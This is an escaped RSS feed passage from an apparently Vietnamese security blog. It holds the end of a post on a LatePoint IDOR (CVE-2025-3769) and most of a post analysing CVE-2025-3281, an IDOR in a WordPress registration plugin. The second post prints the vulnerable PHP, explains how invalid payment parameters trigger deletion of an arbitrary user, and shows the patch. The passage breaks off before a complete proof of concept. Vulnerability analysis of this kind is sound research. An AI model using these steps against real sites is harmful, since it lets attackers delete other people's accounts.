aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE‑2025‑3769 xuất phát từ việc thiếu kiểm tra quyền sở hữu dữ liệu trong các action của OsCustomerCabinetController. Người dùng có session hợp lệ có thể truy cập booking của người khác. Bản vá 5.1.93 đã kiểm tra customer_id trước khi trả dữ liệu, ngăn chặn IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication không đồng nghĩa với Authorization.&lt;/li&gt;&#xA;&lt;li&gt;Không nên tin tưởng dữ liệu client gửi lên (ID, route, params).&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra ownership ở tầng business logic.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic routing cần kiểm soát chặt quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;IDOR xảy ra khi thiếu kiểm tra mối quan hệ user–object.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-92-unauthenticated-insecure-direct-object-reference-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin &amp;lt;= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;  h&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3281 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;User Registration &amp;amp; Membership – Custom Registration Form, Login Form, and User Profile&lt;/strong&gt; cho WordPress bị &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;4.2.1&lt;/strong&gt;, thông qua hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt;, do &lt;strong&gt;thiếu kiểm tra hợp lệ đối với khóa &lt;code&gt;member_id&lt;/code&gt; do người dùng kiểm soát&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;xóa tài khoản người dùng bất kỳ&lt;/strong&gt; đã đăng ký thông qua plugin này.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo mô tả của CVE, lỗ hổng nằm trong hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt; của plugin. Hàm này xử lý việc tạo subscription Stripe cho người dùng sau khi đăng ký.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_stripe_subscription() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_membership_confirm_payment&amp;#39; );&#xA;    $customer_id       = isset( $_POST[&amp;#39;customer_id&amp;#39;] ) ? $_POST[&amp;#39;customer_id&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $payment_method_id = isset( $_POST[&amp;#39;payment_method_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;payment_method_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $member_id         = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) ); &#xA;&#xA;    $is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;    if ( ! $is_user_created ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid Request.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $stripe_service      = new StripeService();&#xA;    $form_response       = isset( $_POST[&amp;#39;form_response&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;form_response&amp;#39;] ), true ) : array();&#xA;    $stripe_subscription = $stripe_service-&amp;gt;create_subscription( $customer_id, $payment_method_id, $member_id );&#xA;&#xA;    if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;        wp_send_json_success( $stripe_subscription );&#xA;    } else {&#xA;        wp_delete_user( absint( $member_id ) );&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện check nonce bằng cách gọi &lt;code&gt;ur_membership_verify_nonce( &#39;ur_membership_confirm_payment&#39; );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;ur_membership_confirm_payment&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;639&#34; width=&#34;1645&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;nonce được tạo với key là &lt;code&gt;_confirm_payment_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key và value này được thêm trong endpoint &lt;code&gt;/membership-registration/?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#39; alt=&#34;Value&#34; height=&#34;442&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở đầu hàm, dữ liệu được lấy trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt;, bao gồm &lt;code&gt;customer_id&lt;/code&gt;, &lt;code&gt;payment_method_id&lt;/code&gt; và đặc biệt là &lt;code&gt;member_id&lt;/code&gt; được lấy trực tiếp từ request mà không có cơ chế xác thực quyền sở hữu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member_id = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp theo, hàm kiểm tra xem user tương ứng với &lt;code&gt;member_id&lt;/code&gt; có meta &lt;code&gt;urm_user_just_created&lt;/code&gt; hay không:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;if ( ! $is_user_created ) {&#xA;    wp_send_json_error( ... );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là chỉ cần user đó từng được tạo thông qua luồng đăng ký của plugin thì điều kiện sẽ hợp lệ, &lt;strong&gt;không hề kiểm tra xem người gửi request có quyền thao tác trên user này hay không&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Cần lưu ý rằng user phải được đăng ký thông qua form &lt;code&gt;Registration&lt;/code&gt; tại &lt;a href=&#34;http://localhost/registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/registration/&lt;/a&gt;, chứ không phải qua &lt;code&gt;Membership Registration&lt;/code&gt; tại &lt;a href=&#34;http://localhost/membership-registration/?&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/membership-registration/?&lt;/a&gt; thì &lt;code&gt;$is_user_created&lt;/code&gt; mới thực sự có giá trị.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Sau đó, hàm gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$stripe_subscription = $stripe_service-&amp;gt;create_subscription(&#xA;    $customer_id,&#xA;    $payment_method_id,&#xA;    $member_id&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị trả về của hàm này quyết định luồng xử lý tiếp theo. Nếu &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; là &lt;code&gt;false&lt;/code&gt;, đoạn code tiếp theo sẽ xóa user tương ứng với &lt;code&gt;$member_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;    wp_send_json_success( $stripe_subscription );&#xA;} else {&#xA;    wp_delete_user( absint( $member_id ) );&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Để khiến &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; trở thành &lt;code&gt;false&lt;/code&gt;, ta có thể &lt;strong&gt;truyền thiếu hoặc gửi giá trị không hợp lệ cho &lt;code&gt;$customer_id&lt;/code&gt; và &lt;code&gt;$payment_method_id&lt;/code&gt;&lt;/strong&gt;, từ đó kiểm soát kết quả trả về. Việc thiếu các tham số này sẽ khiến hàm &lt;code&gt;create_subscription()&lt;/code&gt; không thể tạo subscription hợp lệ, dẫn đến nhánh xử lý lỗi được kích hoạt.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Điều này dẫn đến lỗ hổng &lt;strong&gt;IDOR (Insecure Direct Object Reference)&lt;/strong&gt; nghiêm trọng, cho phép xóa tài khoản người dùng một cách trái phép.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;code&gt;v4.2.2&lt;/code&gt; bổ sung &lt;strong&gt;kiểm tra quyền trước khi thao tác trên user&lt;/strong&gt; để ngăn lỗ hổng IDOR:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $member_id ) ) {&#xA;&#x9;wp_send_json_error(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Trước khi gọi &lt;code&gt;$stripe_service-&amp;gt;create_subscription()&lt;/code&gt;, hàm sẽ xác thực xem &lt;strong&gt;người gửi request có quyền chỉnh sửa user với &lt;code&gt;member_id&lt;/code&gt; hay không&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có quyền → trả về lỗi JSON và &lt;strong&gt;không thực hiện xóa user&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#34; title=&#34;Sự thay đổi trong bản vá&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi trong bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#39; alt=&#34;Diff&#34; height=&#34;847&#34; width=&#34;1795&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi trong bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này đảm bảo rằng chỉ user hợp lệ mới có thể trigger các thao tác dẫn đến &lt;code&gt;wp_delete_user()&lt;/code&gt;, &lt;strong&gt;đóng lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Tính năng MemberShip mặc định không được bật. bạn cần phải truy cập &lt;a href=&#34;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/a&gt; để bật nó lên.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;Plugin đã đăng ký một loạt các action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh sách &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;create_stripe_subscription&lt;/code&gt;&lt;/strong&gt; được đánh dấu &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là plugin đăng ký 